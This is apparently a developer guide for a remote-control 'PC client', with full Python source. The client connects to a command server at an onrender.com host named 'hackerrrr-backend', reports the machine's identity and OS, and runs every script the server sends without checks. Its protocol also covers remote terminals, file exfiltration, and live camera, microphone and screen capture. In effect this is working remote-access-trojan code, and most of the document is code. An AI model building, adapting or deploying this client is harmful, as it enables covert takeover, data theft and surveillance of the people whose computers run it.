# PC Client Implementation Guide

## Latest Implementation (Simplified WebSocket Connection)

This guide explains how to implement the PC client to connect to the server using the simplified WebSocket connection system.

---

## Table of Contents

1. [Overview](#overview)
2. [Connection Setup](#connection-setup)
3. [Message Types](#message-types)
4. [Required Messages](#required-messages)
5. [Script Execution](#script-execution)
6. [Error Handling](#error-handling)
7. [Complete Example](#complete-example)

---

## Overview

The PC client connects to the server via WebSocket and:
- Maintains a persistent connection
- Sends heartbeats to keep connection alive
- Receives and executes scripts from the server
- Sends status updates and results back to the server

**Key Points:**
- **Simple Connection**: Just connect, send messages, receive messages - no complex verification
- **Automatic Reconnection**: If connection drops, reconnect automatically
- **Heartbeat Required**: Send heartbeat every 5 seconds to keep connection alive
- **PC Info on Connect**: Send PC info immediately after connection

---

## Connection Setup

### 1. WebSocket Connection

```python
import asyncio
import json
import websockets
import socket

# Server URL (use wss:// for production, ws:// for local)
SERVER_URL = "wss://hackerrrr-backend.onrender.com"  # or "ws://localhost:8000"
PC_ID = socket.gethostname()  # Use hostname as PC ID

# WebSocket URI
WS_URI = f"{SERVER_URL}/ws/{PC_ID}"
```

### 2. Connect and Maintain Connection

```python
async def connect_to_server():
    """Connect to server and maintain connection"""
    while True:
        try:
            async with websockets.connect(WS_URI) as websocket:
                print(f"[+] Connected to server as {PC_ID}")
                
                # Send PC info immediately after connection
                await send_pc_info(websocket)
                
                # Start heartbeat task
                heartbeat_task = asyncio.create_task(send_heartbeat(websocket))
                
                # Listen for messages
                await listen_for_messages(websocket)
                
        except websockets.exceptions.ConnectionClosed:
            print("[!] Connection closed, reconnecting in 1 second...")
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[!] Connection error: {e}, reconnecting in 1 second...")
            await asyncio.sleep(1)
```

---

## Message Types

### Messages FROM Server (PC Receives)

| Type | Description | Fields |
|------|-------------|--------|
| `connection` | Welcome message after connection | `status`, `message`, `server_url` |
| `script` | Script to execute | `script_name`, `script_content`, `server_url`, `execution_id`, `script_params` |
| `heartbeat` | Server heartbeat response | `status` |
| `start_stream` | Start streaming (camera/microphone/screen) | `stream_type` |
| `stop_stream` | Stop streaming | `stream_type` |
| `download_file` | Request file download | `file_path`, `request_id`, `max_size` |
| `start_terminal` | Start terminal session | `session_id` |
| `terminal_command` | Execute command in terminal | `session_id`, `command` |
| `stop_terminal` | Stop terminal session | `session_id` |
| `stop_pc` | Stop PC client completely | - |

### Messages TO Server (PC Sends)

| Type | Description | Required Fields |
|------|-------------|-----------------|
| `pc_info` | PC information | `ip_address`, `hostname` |
| `heartbeat` | Keep connection alive | - |
| `status` | Status update | `message` |
| `result` | Script execution result | `message`, `execution_id` |
| `error` | Error occurred | `message`, `execution_id` |
| `execution_complete` | Script execution finished | `execution_id`, `status`, `result` |
| `log` | Log content from script | `execution_id`, `script_name`, `log_content`, `log_level` |
| `file_download_response` | File download result | `request_id`, `success`, `file_content` (base64) |
| `terminal_output` | Terminal output | `session_id`, `output`, `is_complete` |
| `terminal_ready` | Terminal session ready | `session_id` |
| `terminal_error` | Terminal error | `session_id`, `error` |
| `camera_frame` | Camera frame (base64 JPEG) | `frame` |
| `microphone_audio` | Audio chunk (base64) | `audio` |
| `screen_frame` | Screen frame (base64 JPEG) | `frame` |
| `stream_status` | Streaming status | `stream_type`, `status` |

---

## Required Messages

### 1. PC Info (Send Immediately After Connection)

**CRITICAL**: Send this immediately after WebSocket connection is established.

```python
async def send_pc_info(websocket):
    """Send PC information to server"""
    import socket
    
    # Get IP address
    ip_address = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
    except:
        pass
    
    # Get hostname
    hostname = socket.gethostname()
    
    # Send PC info
    await websocket.send(json.dumps({
        "type": "pc_info",
        "ip_address": ip_address,
        "hostname": hostname,
        "name": hostname,
        "os_info": {
            "platform": platform.system(),
            "version": platform.version(),
            "architecture": platform.machine()
        }
    }))
```

### 2. Heartbeat (Send Every 5 Seconds)

**CRITICAL**: Send heartbeat every 5 seconds to keep connection alive.

```python
async def send_heartbeat(websocket):
    """Send heartbeat every 5 seconds"""
    while True:
        try:
            await asyncio.sleep(5)
            await websocket.send(json.dumps({
                "type": "heartbeat"
            }))
        except:
            break
```

### 3. Status Message (After Connection)

```python
async def send_status(websocket):
    """Send initial status"""
    await websocket.send(json.dumps({
        "type": "status",
        "message": f"PC {PC_ID} ready and waiting for scripts"
    }))
```

---

## Script Execution

### Receiving and Executing Scripts

```python
async def handle_script_message(websocket, data):
    """Handle script execution request"""
    script_name = data.get("script_name")
    script_content = data.get("script_content")
    server_url = data.get("server_url")
    execution_id = data.get("execution_id")
    script_params = data.get("script_params", {})
    
    print(f"[*] Executing script: {script_name}")
    
    try:
        # Create temporary script file
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(script_content)
            temp_script = f.name
        
        # Set environment variables for script parameters
        import os
        for key, value in script_params.items():
            os.environ[key] = str(value)
        
        # Execute script
        result = subprocess.run(
            [sys.executable, temp_script],
            capture_output=True,
            text=True,
            timeout=300  # 5 minute timeout
        )
        
        # Send execution complete
        await websocket.send(json.dumps({
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "success" if result.returncode == 0 else "failed",
            "result": {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        }))
        
        # Clean up
        os.unlink(temp_script)
        
    except Exception as e:
        # Send error
        await websocket.send(json.dumps({
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "failed",
            "error_message": str(e)
        }))
```

---

## Error Handling

### Connection Errors

```python
try:
    async with websockets.connect(WS_URI) as websocket:
        # Connection successful
        pass
except websockets.exceptions.ConnectionClosed:
    # Connection closed by server - reconnect
    await asyncio.sleep(1)
    # Retry connection
except Exception as e:
    # Other errors - log and reconnect
    print(f"[!] Error: {e}")
    await asyncio.sleep(1)
    # Retry connection
```

### Message Handling Errors

```python
try:
    message = await websocket.recv()
    data = json.loads(message)
    # Handle message
except json.JSONDecodeError:
    print("[!] Invalid JSON received")
except Exception as e:
    print(f"[!] Error handling message: {e}")
    # Continue listening
```

---

## Complete Example

```python
"""
PC Client - Complete Implementation
"""
import asyncio
import json
import websockets
import socket
import subprocess
import sys
import os
import tempfile
import platform

# Configuration
SERVER_URL = "wss://hackerrrr-backend.onrender.com"  # Change to your server URL
PC_ID = socket.gethostname()
WS_URI = f"{SERVER_URL}/ws/{PC_ID}"

async def send_pc_info(websocket):
    """Send PC information immediately after connection"""
    # Get IP address
    ip_address = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_address = s.getsockname()[0]
        s.close()
    except:
        pass
    
    await websocket.send(json.dumps({
        "type": "pc_info",
        "ip_address": ip_address,
        "hostname": socket.gethostname(),
        "name": socket.gethostname(),
        "os_info": {
            "platform": platform.system(),
            "version": platform.version(),
            "architecture": platform.machine()
        }
    }))

async def send_heartbeat(websocket):
    """Send heartbeat every 5 seconds"""
    while True:
        try:
            await asyncio.sleep(5)
            await websocket.send(json.dumps({"type": "heartbeat"}))
        except:
            break

async def execute_script(script_content, script_name, server_url, execution_id, script_params):
    """Execute received script"""
    try:
        # Create temp file
        with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
            f.write(script_content)
            temp_script = f.name
        
        # Set environment variables
        for key, value in script_params.items():
            os.environ[key] = str(value)
        
        # Execute
        result = subprocess.run(
            [sys.executable, temp_script],
            capture_output=True,
            text=True,
            timeout=300
        )
        
        # Send result
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "success" if result.returncode == 0 else "failed",
            "result": {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        }
    except Exception as e:
        return {
            "type": "execution_complete",
            "execution_id": execution_id,
            "status": "failed",
            "error_message": str(e)
        }
    finally:
        try:
            os.unlink(temp_script)
        except:
            pass

async def listen_for_messages(websocket):
    """Listen for messages from server"""
    while True:
        try:
            message = await asyncio.wait_for(websocket.recv(), timeout=30.0)
            data = json.loads(message)
            message_type = data.get("type")
            
            if message_type == "script":
                # Execute script
                result = await execute_script(
                    data.get("script_content"),
                    data.get("script_name"),
                    data.get("server_url"),
                    data.get("execution_id"),
                    data.get("script_params", {})
                )
                await websocket.send(json.dumps(result))
            
            elif message_type == "connection":
                print(f"[*] {data.get('message')}")
                # Send status
                await websocket.send(json.dumps({
                    "type": "status",
                    "message": f"PC {PC_ID} ready and waiting for scripts"
                }))
            
            elif message_type == "heartbeat":
                # Server heartbeat - no response needed
                pass
            
            elif message_type == "stop_pc":
                # Stop PC client
                print("[*] Stop command received, exiting...")
                sys.exit(0)
            
            else:
                print(f"[*] Received message type: {message_type}")
        
        except asyncio.TimeoutError:
            # Timeout - continue listening
            continue
        except websockets.exceptions.ConnectionClosed:
            # Connection closed
            break
        except Exception as e:
            print(f"[!] Error handling message: {e}")
            continue

async def connect_to_server():
    """Main connection loop"""
    while True:
        try:
            async with websockets.connect(WS_URI) as websocket:
                print(f"[+] Connected to server as {PC_ID}")
                
                # Send PC info immediately
                await send_pc_info(websocket)
                
                # Start heartbeat
                heartbeat_task = asyncio.create_task(send_heartbeat(websocket))
                
                # Listen for messages
                await listen_for_messages(websocket)
                
        except websockets.exceptions.ConnectionClosed:
            print("[!] Connection closed, reconnecting in 1 second...")
            await asyncio.sleep(1)
        except Exception as e:
            print(f"[!] Connection error: {e}, reconnecting in 1 second...")
            await asyncio.sleep(1)

if __name__ == "__main__":
    print(f"[*] PC Client Starting...")
    print(f"[*] Server: {SERVER_URL}")
    print(f"[*] PC ID: {PC_ID}")
    print(f"[*] WebSocket URI: {WS_URI}")
    
    asyncio.run(connect_to_server())
```

---

## Important Notes

### 1. Connection Flow

1. **Connect** → WebSocket connection to `{SERVER_URL}/ws/{PC_ID}`
2. **Send PC Info** → Immediately after connection (CRITICAL)
3. **Send Status** → After receiving connection message
4. **Start Heartbeat** → Every 5 seconds
5. **Listen** → For messages from server

### 2. Heartbeat

- **Required**: Send heartbeat every 5 seconds
- **Purpose**: Keep connection alive
- **Format**: `{"type": "heartbeat"}`

### 3. Script Execution

- Scripts are sent as `{"type": "script", ...}`
- Execute script in subprocess
- Send result as `{"type": "execution_complete", ...}`
- Include `execution_id` in response

### 4. Error Handling

- **Connection drops**: Reconnect automatically
- **Message errors**: Log and continue
- **Script errors**: Send error response with `execution_id`

### 5. Environment Variables

Scripts may receive parameters via environment variables:
- Set `os.environ[key] = value` before executing script
- Scripts can access via `os.environ.get(key)`

---

## Testing

### Local Testing

```python
SERVER_URL = "ws://localhost:8000"
```

### Production

```python
SERVER_URL = "wss://hackerrrr-backend.onrender.com"
```

### Verify Connection

1. Run PC client
2. Check server logs for: `[+] PC connected: {PC_ID}`
3. Check PC client logs for: `[+] Connected to server as {PC_ID}`
4. Send test script from server
5. Verify script executes and result is received

---

## Troubleshooting

### Connection Issues

- **"Connection refused"**: Server not running or wrong URL
- **"Connection closed"**: Server closed connection (check server logs)
- **"Timeout"**: Network issue or server not responding

### Message Issues

- **"Invalid JSON"**: Check message format
- **"Missing field"**: Ensure all required fields are present
- **"Script execution failed"**: Check script content and dependencies

### Status Issues

- **PC shows as offline**: Heartbeat not being sent or connection dropped
- **Scripts not received**: Connection not properly established
- **Results not sent**: Check `execution_id` is included in response

---

## Dependencies

```txt
websockets>=12.0
```

Install:
```bash
pip install websockets
```

---

## Summary

**Simple Rules:**
1. Connect to `{SERVER_URL}/ws/{PC_ID}`
2. Send `pc_info` immediately after connection
3. Send `heartbeat` every 5 seconds
4. Listen for messages and handle them
5. Reconnect automatically if connection drops

**That's it!** No complex verification, no extra checks - just connect, send, receive, and execute.

